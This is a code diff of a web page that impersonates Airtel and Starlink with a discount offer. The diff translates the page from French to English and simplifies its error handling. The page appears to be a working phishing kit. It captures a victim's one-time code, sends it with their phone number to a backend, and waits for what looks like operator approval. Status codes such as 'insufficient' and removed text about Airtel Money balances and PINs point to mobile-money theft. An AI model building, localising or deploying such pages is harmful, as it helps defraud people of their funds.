@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
-  <title>Airtel Lite - Vérification OTP</title>
+  <title>Airtel Lite - OTP Verification</title>
   <style>
     :root {
       --airtel-red: #cf1a20;
@@ -130,10 +130,6 @@
       font-weight: 700;
       margin-bottom: 42px;
     }
-    .phone-number {
-      color: var(--text-dark);
-      white-space: nowrap;
-    }
     .otp-label {
       text-align: left;
       color: var(--text-dark);
@@ -159,7 +155,6 @@
       outline: none;
       box-shadow: inset 0 0 0 2px #dfe5ea;
     }
-    .otp-row input::-ms-reveal { display: none; }
     .otp-row input:focus { border-color: var(--airtel-red); }
     .verify-btn {
       width: 100%;
@@ -237,32 +232,6 @@
       font-size: 30px;
       font-weight: 900;
     }
-    .rejection-mark {
-      width: 52px;
-      height: 52px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 0 auto 18px;
-      background: #d64545;
-      color: #fff;
-      font-size: 30px;
-      font-weight: 900;
-    }
-    .retry-btn {
-      display: block;
-      width: 100%;
-      min-height: 58px;
-      margin-top: 18px;
-      border: none;
-      border-radius: 12px;
-      background: var(--airtel-red);
-      color: #fff;
-      font-size: 18px;
-      font-weight: 800;
-      cursor: pointer;
-    }
 
     @media (max-width: 480px) {
       body { min-height: 100dvh; }
@@ -304,39 +273,39 @@
 </head>
 <body>
   <header class="topbar">
-    <img src="logo.svg" alt="Airtel" class="logo-img">
+    <img src="assets/img/logo.svg" alt="Airtel" class="logo-img">
     <div class="top-actions" aria-hidden="true">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12.5a11 11 0 0 1 14 0M8.5 16a6 6 0 0 1 7 0M12 19.5h.01"/><path d="M2.5 9a15 15 0 0 1 19 0"/></svg>
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 11l9-8 9 8"/><path d="M5 10v10h14V10M9 20v-6h6v6"/></svg>
-      <div class="language">FR</div>
+      <div class="language">EN / SW</div>
     </div>
   </header>
 
   <div class="offer-bar">
     <span class="offer-chip">70% OFF</span>
-    <span class="offer-text">OFFRES DISPONIBLES JUSQU’EN MAI 2027</span>
+    <span class="offer-text">OFFERS RUN UNTIL MAY 2027</span>
   </div>
 
   <main>
     <section class="secure-card" id="otpForm">
       <div class="secure-head">
         <div class="partner-row">
-          <img src="logo.svg" alt="Airtel" class="logo-img">
+          <img src="assets/img/logo.svg" alt="Airtel" class="logo-img">
           <span class="multiply">×</span>
           <div class="starlink-box"><strong>Starlink</strong><small>STARLINK</small></div>
         </div>
-        <h1>Vérification sécurisée</h1>
+        <h1>Secure verification</h1>
       </div>
       <div class="secure-body">
-        <p class="intro">Entrez le code à 4 chiffres envoyé au <span class="phone-number" id="phoneNumber"></span></p>
-        <h2 class="otp-label">Code de vérification</h2>
+        <p class="intro">Enter the 4-digit code to confirm your purchase</p>
+        <h2 class="otp-label">Verification code</h2>
         <div class="otp-row" id="otpRow">
           <input type="password" maxlength="1" inputmode="numeric" autocomplete="one-time-code" aria-label="Digit 1">
           <input type="password" maxlength="1" inputmode="numeric" aria-label="Digit 2">
           <input type="password" maxlength="1" inputmode="numeric" aria-label="Digit 3">
           <input type="password" maxlength="1" inputmode="numeric" aria-label="Digit 4">
         </div>
-        <button class="verify-btn" id="verifyBtn" disabled>CONTINUER</button>
+        <button class="verify-btn" id="verifyBtn" disabled>CONTINUE</button>
         <p class="error" id="error"></p>
       </div>
     </section>
@@ -346,10 +315,8 @@
     <div class="approval-card">
       <div class="spinner" id="spinner"></div>
       <div class="approved-mark hidden" id="approvedMark">✓</div>
-      <div class="rejection-mark hidden" id="rejectionMark">!</div>
-      <h2 id="overlayTitle">Veuillez patienter...</h2>
-      <p id="overlayText">Cela prend généralement quelques secondes</p>
-      <button type="button" class="retry-btn hidden" id="retryBtn">RÉESSAYER</button>
+      <h2 id="overlayTitle">Verifying OTP</h2>
+      <p id="overlayText">Please wait</p>
     </div>
   </div>
 
@@ -357,11 +324,7 @@
     const params = new URLSearchParams(window.location.search);
     const plan = params.get('plan') || '—';
     const price = params.get('price') || '—';
-    const phone = params.get('phone') || sessionStorage.getItem('airtelPhone') || '';
-    const digits = phone.replace(/\D/g, '').replace(/^243/, '').replace(/^0/, '');
-    const groupedDigits = digits.replace(/^(\d{3})(\d{3})(\d+)$/, '$1 $2 $3');
-    const formattedPhone = digits ? '+243 ' + groupedDigits : '';
-    document.getElementById('phoneNumber').textContent = formattedPhone;
+    const phone = params.get('phone') || '';
     const otpForm = document.getElementById('otpForm');
     const otpBoxes = Array.from(document.querySelectorAll('#otpRow input'));
     const verifyBtn = document.getElementById('verifyBtn');
@@ -369,12 +332,9 @@
     const overlay = document.getElementById('approvalOverlay');
     const spinner = document.getElementById('spinner');
     const approvedMark = document.getElementById('approvedMark');
-    const rejectionMark = document.getElementById('rejectionMark');
     const overlayTitle = document.getElementById('overlayTitle');
     const overlayText = document.getElementById('overlayText');
-    const retryBtn = document.getElementById('retryBtn');
     let pollTimer = null;
-    let retryDestination = '';
 
     function getOtp() {
       return otpBoxes.map(box => box.value).join('');
@@ -411,37 +371,9 @@
       overlay.classList.add('visible');
       spinner.classList.remove('hidden');
       approvedMark.classList.add('hidden');
-      rejectionMark.classList.add('hidden');
-      retryBtn.classList.add('hidden');
-      overlayTitle.textContent = 'Veuillez patienter...';
-      overlayText.textContent = 'Cela prend généralement quelques secondes';
+      overlayTitle.textContent = 'Verifying OTP';
+      overlayText.textContent = 'Please wait';
     }
-
-    function showRejected(title, message, destination = '') {
-      spinner.classList.add('hidden');
-      approvedMark.classList.add('hidden');
-      rejectionMark.classList.remove('hidden');
-      overlayTitle.textContent = title;
-      overlayText.textContent = message;
-      retryBtn.classList.remove('hidden');
-      retryDestination = destination;
-      overlay.classList.add('visible');
-    }
-
-    retryBtn.addEventListener('click', () => {
-      if (retryDestination) {
-        window.location.href = retryDestination;
-        return;
-      }
-      overlay.classList.remove('visible');
-      otpForm.classList.remove('hidden');
-      otpBoxes.forEach(box => box.value = '');
-      verifyBtn.disabled = true;
-      errorEl.textContent = '';
-      rejectionMark.classList.add('hidden');
-      retryBtn.classList.add('hidden');
-      otpBoxes[0].focus();
-    });
 
     verifyBtn.addEventListener('click', async () => {
       if (!updateOtpState()) return;
@@ -455,7 +387,7 @@
           body: JSON.stringify({ plan, price, phone, otp: getOtp(), step: 'otp' })
         });
         const data = await res.json();
-        if (!res.ok) throw new Error(data.error || 'Impossible d’envoyer la demande.');
+        if (!res.ok) throw new Error(data.error || 'Unable to send the request.');
 
         pollTimer = setInterval(async () => {
           try {
@@ -466,31 +398,26 @@
               clearInterval(pollTimer);
               spinner.classList.add('hidden');
               approvedMark.classList.remove('hidden');
-              overlayTitle.textContent = 'Vérification terminée';
-              overlayText.textContent = 'Votre achat a été confirmé';
+              overlayTitle.textContent = 'Verification complete';
+              overlayText.textContent = 'Your purchase has been confirmed';
               setTimeout(() => {
                 window.location.href = 'mwish.html?' + params.toString();
               }, 800);
             } else if (['denied', 'insufficient', 'demo_error'].includes(statusData.status)) {
               clearInterval(pollTimer);
-              if (statusData.status === 'insufficient') {
-                showRejected('Solde insuffisant', 'Veuillez approvisionner votre compte Airtel Money.');
-              } else if (statusData.status === 'demo_error') {
-                showRejected(
-                  'Code PIN incorrect',
-                  'Veuillez saisir le code PIN correct.',
-                  'trial.html?' + params.toString()
-                );
-              } else {
-                showRejected('Code incorrect', 'Veuillez saisir le code de vérification correct.');
-              }
+              overlay.classList.remove('visible');
+              otpForm.classList.remove('hidden');
+              otpBoxes.forEach(box => box.value = '');
+              verifyBtn.disabled = true;
+              errorEl.textContent = 'Invalid code or request denied.';
+              otpBoxes[0].focus();
             }
           } catch (err) {}
         }, 2000);
       } catch (err) {
         overlay.classList.remove('visible');
         otpForm.classList.remove('hidden');
-        errorEl.textContent = err.message || 'Impossible d’envoyer la demande.';
+        errorEl.textContent = err.message || 'Unable to send the request.';
       }
     });
 
